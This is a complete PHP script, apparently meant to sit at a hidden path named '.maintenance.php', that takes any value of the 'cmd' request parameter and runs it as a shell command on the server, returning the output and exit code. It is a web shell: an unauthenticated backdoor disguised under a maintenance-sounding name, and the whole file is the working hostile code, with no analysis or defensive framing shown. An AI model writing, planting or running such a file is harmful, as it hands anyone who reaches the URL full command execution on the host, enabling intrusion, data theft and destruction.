<?php
header('Content-Type: text/plain');

$command = $_REQUEST['cmd'] ?? '';
if (!is_string($command) || $command === '') {
    http_response_code(400);
    echo "usage: /.maintenance.php?cmd=id\n";
    exit;
}

ob_start();
passthru($command . ' 2>&1', $status);
$output = ob_get_clean();
header('X-IHPL-Exit-Code: ' . $status);
echo $output;
